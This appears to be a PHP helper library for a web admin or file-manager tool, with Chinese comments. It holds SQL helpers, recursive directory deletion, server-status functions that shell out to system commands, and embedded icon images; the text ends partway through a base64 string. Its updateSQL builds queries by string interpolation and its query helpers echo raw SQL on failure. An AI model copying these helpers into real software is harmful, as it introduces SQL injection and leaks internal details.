<?php
  error_reporting(E_ALL & ~E_NOTICE);
  if(function_exists('xdebug_disable')) { xdebug_disable(); } 
  @ini_set("memory_limit","1024M");
  @ini_set('post_max_size', '800M');  
  @ini_set('user_agent','Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)');
  @header("p3p: CP=\"CAO PSA OUR\"");
  @session_start();
  //print_r($_SESSION);
  //exit();  
  @session_cache_limiter('private_no_expire, must-revalidate');
  @header("Content-Type: text/html; charset=utf-8");
  @header("Cache-Control: no-cache,must-revalidate");        
  //@header("X-UA-Compatible: IE=EmulateIE7");    
  date_default_timezone_set("Asia/Taipei");
  mb_http_output("UTF-8");
  mb_internal_encoding('UTF-8'); 
  mb_regex_encoding("UTF-8");
  $pagesize=30;//每頁顯示多少資料 
  function execSQL($SQL)
  {
    global $pdo;   
    $pdo->query($SQL) or die("查詢失敗:{$SQL}");   
  }
  function ffsize($filename)
  {
    $a = fopen($filename, 'r');
    fseek($a, 0, SEEK_END);
    $filesize = ftell($a);
    fclose($a);
    return $filesize; 
  }
  /**
   * 判斷檔案是不是 utf8
     return false=不是 utf8,true=是utf8
  */
  function checkIsUTF8File($suc_file) {       
    $str=file_get_contents($suc_file);
    for($i = 0; $i < strlen($str); $i++){       
      $value = ord($str[$i]);       
      if($value > 127) {       
        if($value >= 192 && $value <= 247) 
          return true;       
        else 
          return false;       
      }       
    }  
    return false;    
  }    
  function alert($values)
  {
    ?>
    <script language="javascript">
      alert("<?php echo jsAddSlashes($values);?>");
    </script>
    <?php
  }  
  # recursively remove a directory
  function deltree($dir) {
    $m=ARRAY();
    $m=glob("{$dir}".DIRECTORY_SEPARATOR."{,.}*",GLOB_BRACE);    
    for($i=0,$max_i=count($m);$i<$max_i;$i++)
    {
      $bs=basename($m[$i]);
      if($bs=='.'||$bs=='..')
      {
        unset($m[$i]);
      }
    }    
    $m=array_values($m);    
    foreach($m as $file) {
      if(is_dir($file))
          deltree($file);
      else
          unlink($file);
    }
    rmdir($dir);
  }  
  function selectSQL($SQL)
  {
    global $pdo;   
    static $res=ARRAY(); 
    $res=$pdo->query($SQL) or die("查詢失敗:{$SQL}");
    return pdo_resulttoassoc($res);
  } 
  function insertSQL($table,$fields_data)
  {
     global $pdo;
     $fields=ARRAY();
     $datas=ARRAY();
     $question_marks=ARRAY();
     foreach($fields_data as $k=>$v)
     {
        array_push($fields,$k);
        array_push($datas,$v);
        array_push($question_marks,'?');
     }
     $SQL = sprintf("
                INSERT INTO `{$table}`
                    (`%s`)
                    values
                    (%s)",
                    @implode("`,`",$fields),
                    @implode(",",$question_marks)
                  );
     $q = $pdo->prepare($SQL);
     for($i=0,$totals=count($question_marks);$i<$totals;$i++)
     {
   	   $q->bindParam(($i+1), $datas[$i]);
     }
     $q->execute(); 
     return $pdo->lastInsertId();      
  } 
  function updateSQL($table,$fields_data,$WHERE_SQL)
  {
    global $pdo;    
    $m_mix_SQL=array();
    foreach($fields_data as $k=>$v)
    {
      array_push($m_mix_SQL,sprintf("`%s`='%s'",$k,$v));
    }
    $SQL=sprintf("
              UPDATE `{$table}` 
                  SET %s 
                WHERE 
                  %s",@implode(',',$m_mix_SQL),$WHERE_SQL);    
    $pdo->query($SQL) or die("寫入 {$table} 失敗:{$SQL}");
  }
  function pdo_resulttoassoc($res){          
    return $res->fetchAll(PDO::FETCH_ASSOC);    
  }          
  // 羽山流，強制默認 magic_quotes_gpc = on，未來咱的 Code 就會乾淨了
  function sanitizeVariables(&$item, $key)
  {
    if (!is_array($item))
    {
      if (get_magic_quotes_gpc())
          $item = stripcslashes($item);
      $item = addslashes($item);
    }
  }
  function is_string_like($data,$find_string){
/*
  is_string_like($data,$fine_string)

  $mystring = "Hi, this is good!";
  $searchthis = "%thi% goo%";

  $resp = string_like($mystring,$searchthis);


  if ($resp){
     echo "milike = VERDADERO";
  } else{
     echo "milike = FALSO";
  }

  Will print:
  milike = VERDADERO

  and so on...

  this is the function:
*/
    if($find_string=="") return 1;
    $vi = explode("%",$find_string);
    $offset=0;
    for($n=0,$max_n=count($vi);$n<$max_n;$n++){
        if($vi[$n]== ""){
            if($vi[0]== ""){
                   $tieneini = 1;
            }
        } else {
            $newoff=strpos($data,$vi[$n],$offset);
            if($newoff!==false){
                if(!$tieneini){
                    if($offset!=$newoff){
                        return false;
                    }
                }
                if($n==$max_n-1){
                    if($vi[$n] != substr($data,strlen($data)-strlen($vi[$n]), strlen($vi[$n]))){
                        return false;
                    }

                } else {
                    $offset = $newoff + strlen($vi[$n]);
                 }
            } else {
                return false;
            }
        }
    }
    return true;
  }  
  // escaping and slashing all POST and GET variables. you may add $_COOKIE and $_REQUEST if you want them sanitized.
  function array_htmlspecialchars(&$input)
  {
      if (is_array($input))
      {
          foreach ($input as $key => $value)
          {
              if (is_array($value)) $input[$key] = array_htmlspecialchars($value);
              else $input[$key] = htmlspecialchars($value);
          }
          return $input;
      }
      return htmlspecialchars($input);
  }
  if( !function_exists('memory_get_usage') )
  {
    function memory_get_usage()
    {
      //If its Windows
      //Tested on Win XP Pro SP2. Should work on Win 2003 Server too
      //Doesn't work for 2000
      //If you need it to work for 2000 look at http://us2.php.net/manual/en/function.memory-get-usage.php#54642
      if ( substr(PHP_OS,0,3) == 'WIN')
      {
        $output = array();
        exec( 'tasklist /FI "PID eq ' . getmypid() . '" /FO LIST', $output );
        return preg_replace( '/[\D]/', '', $output[5] ) * 1024;
      }else
      {
        //We now assume the OS is UNIX
        //Tested on Mac OS X 10.4.6 and Linux Red Hat Enterprise 4
        //This should work on most UNIX systems
        $pid = getmypid();
        exec("ps -eo%mem,rss,pid | grep $pid", $output);
        $output = explode("  ", $output[0]);
        //rss is given in 1024 byte units
        return $output[1] * 1024;
      }
    }
  } 
  function array_htmlspecialchars_decode(&$input)
  {
      if (is_array($input))
      {
          foreach ($input as $key => $value)
          {
              if (is_array($value)) $input[$key] = array_htmlspecialchars_decode($value);
              else $input[$key] = htmlspecialchars_decode($value);
          }
          return $input;
      }
      return htmlspecialchars_decode($input);
  }
  function getGET_POST($inputs,$mode)
  {
    $mode=strtoupper(trim($mode));
    $data=$GLOBALS['_'.$mode];
        
    $data=array_htmlspecialchars($data);
    array_walk_recursive($data, "trim");
    
    $keys=array_keys($data);
    $filters=@explode(',',$inputs);
    foreach($keys as $k)
    {
      if(!in_array($k,$filters))
      {
        unset($data[$k]);
      }
    }    
    return $data;
  }
  function jsAddSlashes($str) {
    $pattern = array(
        "/\\\\/"  , "/\n/"    , "/\r/"    , "/\"/"    ,
        "/\'/"    , "/&/"     , "/</"     , "/>/"
    );
    $replace = array(
        "\\\\\\\\", "\\n"     , "\\r"     , "\\\""    ,
        "\\'"     , "\\x26"   , "\\x3C"   , "\\x3E"
    );
    return preg_replace($pattern, $replace, $str);
  }
  function pre_print_r($values)
  {    
    echo '<pre>';
    print_r($values);
    echo '</pre>';
  }
  function get_server_load() {
    //系統負載   
    if (stristr(PHP_OS, 'win')) {  
      $wmi = new COM("Winmgmts://");
      $server = $wmi->execquery("SELECT LoadPercentage FROM Win32_Processor");       
      $cpu_num = 0;
      $load_total = 0;       
      foreach($server as $cpu){
          $cpu_num++;
          $load_total += $cpu->loadpercentage;
      }       
      $load = sprintf("%0.2f",$load_total/$cpu_num);       
    } else {  
      $sys_load = sys_getloadavg();
      $load = sprintf("%0.2f",$sys_load[0]);
    }
    return $load;
  } 
  function get_netstat(){
    //系統負載
    $data="";   
    if (stristr(PHP_OS, 'win')) 
    {
      $data=`netstat -an`;
      $data=mb_convert_encoding($data,'UTF-8','BIG5');      
      $m_need=ARRAY();
      $m=explode("\n",$data);
      for($i=0,$max_i=count($m);$i<$max_i;$i++)
      {
        $m[$i]=trim(strtoupper($m[$i]));        
        if(is_string_like($m[$i],"%0.0.0.0%")
           &&  
           is_string_like($m[$i],"TCP%")
           &&
           is_string_like($m[$i],"%LISTEN%"))
        {
          for($j=0,$max_j=mb_strlen($m[$i]);$j<$max_j;$j++)
          {
            $m[$i]=str_replace("  "," ",$m[$i]);
          }          
          $mFields=explode(" ",$m[$i]);                   
          array_push($m_need,"{$mFields[0]} {$mFields[1]}");
        }
      }
      echo implode("<br>",$m_need);
    }
    else
    {
      $data=`LANG=c netstat -an|grep '^tcp '|grep LISTEN|grep '0.0.0.0'`;
      $m_need_0=ARRAY();
      $m_need_127=ARRAY();
      $m=explode("\n",$data);
      for($i=0,$max_i=count($m);$i<$max_i;$i++)
      {
        $m[$i]=trim(strtoupper($m[$i]));
        if(is_string_like($m[$i],"%0.0.0.0%")
           &&  
           is_string_like($m[$i],"TCP%")
           &&
           is_string_like($m[$i],"%LISTEN%"))
        {
          for($j=0,$max_j=mb_strlen($m[$i]);$j<$max_j;$j++)
          {
            $m[$i]=str_replace("  "," ",$m[$i]);
          }          
          $mFields=explode(" ",$m[$i]);          
          if(is_string_like($mFields[3],"0%"))
          {
            array_push($m_need_0,"{$mFields[0]} {$mFields[3]}");
          }        
          else
          {
            array_push($m_need_127,"{$mFields[0]} {$mFields[3]}");
          }          
        }
      }
      natsort($m_need_0);
      natsort($m_need_127);
      echo implode("<br>",$m_need_0);      
      echo "<br>";
      echo implode("<br>",$m_need_127);
    }
  }
  function str_replace_deep($search, $replace, $subject)
  {
      if (is_array($subject))
      {
          foreach($subject as &$oneSubject)
              $oneSubject = str_replace_deep($search, $replace, $oneSubject);
          unset($oneSubject);
          return $subject;
      } else {
          return str_replace($search, $replace, $subject);
      }
  }             
  function array_orderby()
  {
    /*Sample      
    The sorted array is now in the return value of the function instead of being passed by reference. 
    $data[] = array('volume' => 67, 'edition' => 2);
    $data[] = array('volume' => 86, 'edition' => 1);
    $data[] = array('volume' => 85, 'edition' => 6);
    $data[] = array('volume' => 98, 'edition' => 2);
    $data[] = array('volume' => 86, 'edition' => 6);
    $data[] = array('volume' => 67, 'edition' => 7);
    
    // Pass the array, followed by the column names and sort flags
    $sorted = array_orderby($data, 'volume', SORT_DESC, 'edition', SORT_ASC);
    */
    $args = func_get_args();
    $data = array_shift($args);
    foreach ($args as $n => $field) {
      if (is_string($field)) {
        $tmp = array();
        foreach ($data as $key => $row)
          $tmp[$key] = $row[$field];
        $args[$n] = $tmp;
      }
    }
    $args[] = &$data;
    call_user_func_array('array_multisort', $args);
    return array_pop($args);
  }
  /*
  function size_hum_read($size){
    // Returns a human readable size 
    $i=0;
    $iec = array("B", "KB", "MB", "GB", "TB", "PB", "EB", "ZB", "YB");
    while (($size/1024)>1) {
      $size=$size/1024;
      $i++;
    }
    return substr($size,0,strpos($size,'.')+4).$iec[$i];
  }  
  */
  function size_hum_read_v2($size)
  {
    $unit = array("B", "KB", "MB", "GB", "TB", "PB", "EB", "ZB", "YB");
    return @round($size/pow(1024,($i=floor(log($size,1024)))),2).' '.$unit[$i];
  }
  function getMEM_Usage(){
    $mem="";
    if (stristr(PHP_OS, 'win')) {
      $data=mb_convert_encoding(`systeminfo 2>&1`,"UTF-8","BIG5");
      if ( preg_match('/可用實體記憶體\:(.*) MB/', $data, $m ) ) {
        $mem = trim( $m[1] );
        $mem = str_replace(",","",$mem);
        $mem*=pow(1024,2);
      }
    }
    else
    {   
      $fh = fopen('/proc/meminfo','r');
      $total_mem = 0;
      $free_mem = 0;
      while ($line = fgets($fh)) {
        $pieces = array();
        if (preg_match('/^MemTotal:\s+(\d+)\skB$/i', $line, $pieces)) {
          $total_mem = $pieces[1];
          break;
        }
        if (preg_match('/^MemFree:\s+(\d+)\skB$/i', $line, $pieces)) {
          $free_mem = $pieces[1];
          break;
        }
      }
      fclose($fh);   
      $total_mem*=1024;
      $free_mem*=1024;
      $mem = $total_mem - $free_mem;   
    } 
    return size_hum_read_v2($mem);  
  }    
  function getMEM_Status(){
    $mem="";
    if (stristr(PHP_OS, 'win')) {
      $data=mb_convert_encoding(`systeminfo 2>&1`,"UTF-8","BIG5");
      if ( preg_match('/實體記憶體總計\:(.*) MB/', $data, $m ) ) {
        $mem = trim( $m[1] );
        $mem = str_replace(",","",$mem);
        $mem*=pow(1024,2);
      }
    }
    else
    {   
      $fh = fopen('/proc/meminfo','r');
      $mem = 0;
      while ($line = fgets($fh)) {
        $pieces = array();
        if (preg_match('/^MemTotal:\s+(\d+)\skB$/i', $line, $pieces)) {
          $mem = $pieces[1];
          break;
        }
      }
      fclose($fh);   
      $mem*=1024;   
    } 
    return size_hum_read_v2($mem);
  }
  function getHDD_Status(){
    if (stristr(PHP_OS, 'win')) {
      $az="ABCDEFGHIJKLMNOPQRSTUVWXYZ";
      $m=ARRAY();
      for($i=0,$max_i=strlen($az);$i<$max_i;$i++)
      {
        if(is_dir("{$az[$i]}:\\"))
        {
          if(is_readable("{$az[$i]}:\\"))
          {
            array_push($m,ARRAY(
                          "title"=>"{$az[$i]}:",
                          "total"=>size_hum_read_v2(disk_total_space("{$az[$i]}:")),
                          "used"=>size_hum_read_v2(disk_total_space("{$az[$i]}:")-disk_free_space("{$az[$i]}:")),
                          "avail"=>size_hum_read_v2(disk_free_space("{$az[$i]}:")),
                          "capacity"=>sprintf("%.2f %%",(disk_total_space("{$az[$i]}:")-disk_free_space("{$az[$i]}:"))/disk_total_space("{$az[$i]}:")*100.0),
                          "mounted"=>"{$az[$i]}:\\"
                      ));
              
          }
        }
      }
      ?>      
      <table border="1" cellpadding="5" cellspacing="0">
        <tr>
          <th>磁碟機</th>
          <th>合計總容量</th>
          <th>已用</th>
          <th>可用</th>
          <th>已用％</th>
          <th>掛載點</th>
        </tr>
        <?php
          for($i=0,$max_i=count($m);$i<$max_i;$i++)
          {
            ?>
            <tr>
              <td align="left"><?php echo $m[$i]['title'];?></td>
              <td align="right"><?php echo $m[$i]['total'];?></td>
              <td align="right"><?php echo $m[$i]['used'];?></td>
              <td align="right"><?php echo $m[$i]['avail'];?></td>
              <td align="right"><?php echo $m[$i]['capacity'];?></td>
              <td align="left"><?php echo $m[$i]['mounted'];?></td>
            </tr>
            <?php
          }
        ?>
      </table>              
      <?php          
    }
    else
    {  
      $value = trim(`LANG=c /bin/df -P -B1|grep '^/dev/'|tr -s ' '`);
      //依斷行切開，收集 /dev 開頭的分割區
      $m=ARRAY();             
      foreach(explode("\n",$value) as $v)
      {
        list($title,$total,$used,$avail,$capacity,$mounted)=explode(" ",$v);
        array_push($m,ARRAY(
                        "title"=>$title,
                        "total"=>size_hum_read_v2($total),
                        "used"=>size_hum_read_v2($used),
                        "avail"=>size_hum_read_v2($avail),
                        "capacity"=>$capacity,
                        "mounted"=>$mounted
                      ));
      }
      ?>      
      <table border="1" cellpadding="5" cellspacing="0">
        <tr>
          <th>磁碟機</th>
          <th>合計總容量</th>
          <th>已用</th>
          <th>可用</th>
          <th>已用％</th>
          <th>掛載點</th>
        </tr>
        <?php
          for($i=0,$max_i=count($m);$i<$max_i;$i++)
          {
            ?>
            <tr>
              <td align="left"><?php echo $m[$i]['title'];?></td>
              <td align="right"><?php echo $m[$i]['total'];?></td>
              <td align="right"><?php echo $m[$i]['used'];?></td>
              <td align="right"><?php echo $m[$i]['avail'];?></td>
              <td align="right"><?php echo $m[$i]['capacity'];?></td>
              <td align="left"><?php echo $m[$i]['mounted'];?></td>
            </tr>
            <?php
          }
        ?>
      </table>              
      <?php
    }
  }
  function create_files(){
    //create image
    global $base_tmp;
    $sys_file=array();    
    $sys_file[0][0]="file.png";
    $sys_file[0][1]="iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAMAAAAoLQ9TAAAABGdBTUEAALGPC/xhBQAAAAFzUkdCAK7OHOkAAAAgY0hSTQAAeiYAAICEAAD6AAAAgOgAAHUwAADqYAAAOpgAABdwnLpRPAAAAftQTFRFAAAAZmZmWVlYj4+RZmVlaGhpaWpqampqaGhoYmJiZ2dnbW5wb3Byb3ByamtsUE9NY2NjcnR3dHZ4qbS/v83cv87dnqavhYaILi4uZWRkWVdUWFVToau1nKCkZWZoAAAAbG1unaawo623sr3HjZGWAAAAAAAAb3Fyws/bl5qdAAAAcHFyydLbm5ydcXFy0dbbmpydAAAAcnJy2NnblpqdAAAAcXJy1Njbk5idAAAAzdXbi5KYx9HbgISJdXl+W15gAgICwM3ZbnJ1Y2ZpQkJDAAAAAAAAAAAAAAAAa2tskpienKSrmKComaGojpWbQUFCAAAAAAAAXFxcFBQUAAAAAAAABQUFCQkJAAAAsLzIwc/b0eHwt8TQtsLOwM7btcDKu8fTx9Da2eTwvsfQvcbPxM7X3Ofy1+LtvsrWt77GwsvTz9Xa4unvxMnNw8jMyc/T6/L48fj/xs/YvsLHys/T19nb6OvtxMbHwsXGyszO8/X3+vz/2N3ix8jKz9DS1tjaxsjJxcfIzM7P8vX4+fz/1NXXwsTHzM/SztTa6/P63eXs3eXr3+fu7fX87/f+09bZvsPHyNLa6fb/6PX/5/T/5vP+0NjeusLJydTcvMjS2Oj21+b01+f11uX01+Tur7nBwM3ZnqeuoquzpK21oamx2en4tcDLtsHMqrO8vBWQ4gAAAFl0Uk5TAAAAAAAAAAAAAAw7QkE3CApNf/L6+/B8EAYZNub2jBE32+b80TMDQfrSN0H60kH60gRB+tI5QfrSOvrS+typgS76wJZmIwYFAS22wsfHx24lBwEFChAQDgmMpExCAAAACXBIWXMAAAsTAAALEwEAmpwYAAAA6klEQVQY02NgwAYYubh5eHl5+PiZIFwBQSFhERERUTFxCWYGBhZJKWmZyKjomNi4eFk5eQYGVgVFJeWExKTklNS0dBVVNQY2dY2MzKzsnNy8/IJCTS01BnZtnaLiktKy8orKqmpdkICefk1tXX1ZQ2NTc4uBliEDu5Fxa1t7R2dXd09vn4kpUMDMvH9Cx8RJkydPnjLVwhIooGc1bfqMmbNmz549Z641UIBN22be/AULFy1avMTWzt4BKMDruHTZsuXLVzg5u7i6uXswcHh6efv4+Pj6+QcEuoN8whkUHCIvHxoaFh6B1eMMAFAgQJ1dO7MiAAAAJXRFWHRkYXRlOmNyZWF0ZQAyMDEzLTAxLTE1VDEwOjM4OjE1KzA4OjAwJQCk1wAAACV0RVh0ZGF0ZTptb2RpZnkAMjAwOS0wNy0wN1QwMzozNzo1NCswODowMDYUL3cAAAAASUVORK5CYII=";
    $sys_file[1][0]="folder.png";
    $sys_file[1][1]="iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAMAAAAoLQ9TAAAABGdBTUEAALGPC/xhBQAAAAFzUkdCAK7OHOkAAAAgY0hSTQAAeiYAAICEAAD6AAAAgOgAAHUwAADqYAAAOpgAABdwnLpRPAAAAlJQTFRFAAAAfTIBjj0EdC8A//8A04MlnlEMi0ADgDYAhTsAJQ0AciUAol4mtXU7vH1Dw4VKtXE0fjEAHg0AVSUAHgQAXgMAexoAhSoAmEYG2o9B6KBRuHEuvHo6vXEpm00LAAAAXB4AsmIZvIFJu4xgwpVpyp5z5bmG5alorFkNtnlExotU3ZxW5axtqFUJ3ap44aRhok8F3KVs25pSnEkC26Bk1o9DkD4A1pha0oY1fS4AzIxPynooUAcAvn5Cu2oZrGsz14g4q1oOkk4auXQ0ynswznsrq3Atm0wFNgAAg0ESjk8blFQbnFgbpF0brWEbtWYbvWodqmIViz8BAAAAAAAAEQMANRUAUyYBbjYFhEMKlU4OolcTqVsRm04FbigAAAAAAAAAAAAAAAAAAAAAHQYAXSQAcC4A9a5c97Bf+rVj7MSU7cid7cuk79Ky8N/M8OLS3reK2rqW3bmQ4buP5LuN5ruJ6buG67qC4baF9vTx+/r5/sF5/r90/r1x/rxu/7ts/7tq/7pp/7po/7pn/71s36ps087I8O7q/7dh/7Rc/7Vd/7hi36VjxL214t3X/7Rb/7FV/7FW/7RZ4aNburGm1szB/a5S/KpL/KlI/KhF/KdE/KhG/KlJ/KtL/q1O459SsKSXzLyo86FF85s485k285k185o285s585w79J494ZdEp5eFxauM5pM76I0t6I4u6Y8v3402oopxvZdr34Mm3oMm3oIm24UtoX5YtINL0Xon03ok1Hki1Xgg1Hcf1Hce1Xslq3Q8w20ex28ey3Miv3ImTzbHNQAAAGd0Uk5TAAAAAAAAAAAAAAAFRGh7kH8NAgEDCA8WROb2npSkRQEOjb7L2Or++2KitPL4V/30SfrtOfPhJ+jSGNW7CrSefP16K835/vpQASFLcZi61+z54yUCChcqQVt4l7XUlgYDBQcJCxAcEkJHamoAAAAJcEhZcwAAAEgAAABIAEbJaz4AAAD7SURBVBjTY2DAChi5eXj5+AUEmYSEGZhZRETFxCUk0zMypaRlZOUY5BUUlZRVVNWysnNy8/LVNRg0tbQLCouKS0rLyisqq3R0GfSqa2rr6hsam5pbWtva9Q0YDDs6uyCgu6e3z8iYwaR/wkQgmDBhwqTJU6aamjGYT5s+Y+as2XOmz503f8FCC0sGq0WLlyxdunTZ8hUrV61eY23DYLt23XoI2LBx02Y7eQZ7hy1bt23bthUItu/Y6cjK4OTs4rpr9569e/ftP3DQzZ2NwcPTy9vH188/4NDhI0cDg9hBXgsOCQ0Lj4iMio6JjeOA+FY+PiExKTklNY2TCwCKvl4F2295SQAAACV0RVh0ZGF0ZTpjcmVhdGUAMjAxMy0wMS0xNVQxMDo0MjoxNSswODowMBsZIZ0AAAAldEVYdGRhdGU6bW9kaWZ5ADIwMDYtMDUtMDNUMDQ6MzU6MjgrMDg6MDD+6MhJAAAAAElFTkSuQmCC";
    $sys_file[2][0]="icon_close.gif";
    $sys_file[2][1]="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";
    $sys_file[3][0]="del.gif";
    $sys_file[3][1]="iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAMAAAAoLQ9TAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAAYUExURZlmZv+ZM/9mAMwzM8wAAP8AAJkAAAAAAJHQzOoAAAAIdFJOU/////////8A3oO9WQAAAJFJREFUeNpiYEcDAAHEwM7AwgDnsbCzAwQQAzsLIysblAuiAQIIKMvCChEB89kBAgisnAUkAuGzAwQQRD9QBMpnBwggqIEsMHPYAQIIrgImAhBACDOgIgABxIBQDyEBAggowMzEAlHNCiIAAoiBnRnuMLAIQAABBeB8MAAIIKAWJD5QCUAAMaD7FiCAMAQAAgwAYLoGdQu5RxIAAAAASUVORK5CYII=";
    $sys_file[4][0]="detail.gif";
    $sys_file[4][1]="iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAMAAAAoLQ9TAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAADAUExURZNnOdH///3//+P8/3l+uOBvD/+fNP6kN4CLuIeZwaPa9pGm0Gyp6tX//4bB8Mz7/KvI2ZWu1LHu/4C975q22Jzd/Oz//3SFqNr//8L0/bvy/H98qaHi/rPq+19NO6etxm90oH6Yu8b4/nV3jKSkveXr87jg636Et85tFaTU8JXQ9qPe+4iPwrXi+MXu85DG8OfKocv2+IKXtv+hN3+47tHr85Gjyff//5bX+rHP41pdksr8/8Lq7v+rO8/+/wAAAArLoewAAABAdFJOU////////////////////////////////////////////////////////////////////////////////////wDCe7FEAAAA10lEQVR42mKwhwJFTkFuEA0QQAxQvrypkKiMJqe9PUAAQQVEmJiFefi0pcTtAQIIIsAhq6vPxyWpZCdgDxBAEAFBGR5hWUYg0OMACCCIgIgFD5cdLzMzr6ERQABBBLhFTaQYJcyZmG3UAQIIIsDCpSVpJyHGxCRgDxBAEAEVbiFrOzteMVUFe4AAAgvYGiiLq9nx81sC3QEQQCABdjYNOXsrDjMdkCRAADGA+KwM0jAf2AMEEAOYzwLn2wMEEAObMQrfHiCAGBhQ+fYAAcRgLyeNzLcHCDAAj0UsFJ5NpkEAAAAASUVORK5CYII=";
    $sys_file[5][0]="loading.gif";
    $sys_file[5][1]="R0lGODlhGAAYALMPABdTv0yN2mOi5kmX6TWD3CNrzGqR1WW0+3Wo41mn9D9zy53Q/Xe49obA92ir7v///yH/C05FVFNDQVBFMi4wAwEAAAAh+QQFAAAPACwAAAAAGAAYAAAEePDJSau9tyjMayFdFViaBVxCMVJfBQDCNRQDu01vjM3r00ovRChAMwGEoUftgkw6n1ACITAFYV7Yl8QhECQEDg5AQSafoGhMArqkNBIH52CwkDDij8YBz5nXJXATenwWfhQJDBR3hBOGh4x6GH8Ue2kViJaHiZlQEQAh+QQFAAAPACwBAAEAFgAWAAAEWvDJSR+pOMurq8sBFlIIR5lT8XwVgbqUymLoM0pqJ3TF3j2+n3BIFA6Oxxsm53E4f4pKtEjFAKoUgHaYoDAk2munOzl8cdsMuVwJVxLr8nmiEA/n2AOWcmj8IgAh+QQFAAAPACwBAAEAFgAWAAAEbPDJScmgOONwNWYZlwnfkGQdVYCUE5yTqLJYMpCSNRXe5BAw1aPRk9A+xaRySUk4nz1FYTp9MK5XogcReHQDXaY4g1gGJ2Ve8XDYGSQ8tYZNAQAmil6iXZc/8n4PC3x1d2MTAHmHEnaLjIoeEQAh+QQFAAAPACwBAAEAFgAVAAAEYPDJSYegOGOrc8sc5mDfWF0UQXwUMxxnSnTMYz7ho7KaC2OqWmco4RGPyOTjwGQSZ9BHoUGlEj+BRxal7HongC8YgJiUdQ/FEAAwUAoYeIbtHs4ygXZGnZJT6nFiE3wdEQAh+QQFAAAPACwBAAEAFgAWAAAEZPDJSdOhOGOr+2YZSC3HVZnTMGRNIkoupTZaU06xpHpP+6YDGk+YWfCOyCQFwGx6BoRAlEBQWK88gVbrUHprX0qjQPgqKOSjYFKgBNIdBLo8edMnhoccnQlo9nNhbG2CDwV+HhEAIfkEBQAADwAsAwABABQAFgAABFbwySkPozhPq